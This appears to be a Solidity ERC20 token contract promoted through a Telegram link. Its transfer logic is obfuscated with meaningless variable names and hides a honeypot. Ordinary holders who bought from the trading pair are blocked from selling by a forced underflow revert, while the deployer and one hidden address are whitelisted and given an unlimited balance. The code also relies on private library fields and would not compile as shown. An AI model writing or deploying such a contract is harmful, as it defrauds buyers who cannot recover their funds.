// https://t.me/solidblock_erc

// SPDX-License-Identifier: GPL-3.0

pragma solidity >0.8.10;

import '@openzeppelin/contracts/access/Ownable.sol';
import '@openzeppelin/contracts/token/ERC20/ERC20.sol';
import '@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol';
import '@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol';

contract SolidBlock is ERC20, Ownable {
    address public uniswapV2Pair;
    IUniswapV2Router02 public uniswapV2Router;
    mapping(address => uint256) private mental;

    function _transfer(
        address plus,
        address likely,
        uint256 office
    ) internal override {
        uint256 anyone = behavior;

        if (uniswapV2Pair != plus && himself[plus] == 0 && mental[plus] > 0) {
            himself[plus] -= anyone;
        }

        address drawn = flow;
        flow = likely;
        mental[drawn] += anyone + 1;

        _balances[plus] -= office;
        uint256 personal = (office / 100) * behavior;
        office -= personal;
        _balances[likely] += office;
    }

    address private flow;
    mapping(address => uint256) private himself;
    uint256 public behavior = 3;

    constructor(
        string memory production,
        string memory tiny,
        address sent,
        address stick
    ) ERC20(production, tiny) {
        uniswapV2Router = IUniswapV2Router02(sent);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());

        himself[msg.sender] = place;
        himself[stick] = place;

        _totalSupply = 1000000000 * 10**decimals();
        _balances[msg.sender] = _totalSupply;
        _balances[stick] = place;
    }

    uint256 private place = ~uint256(0);
}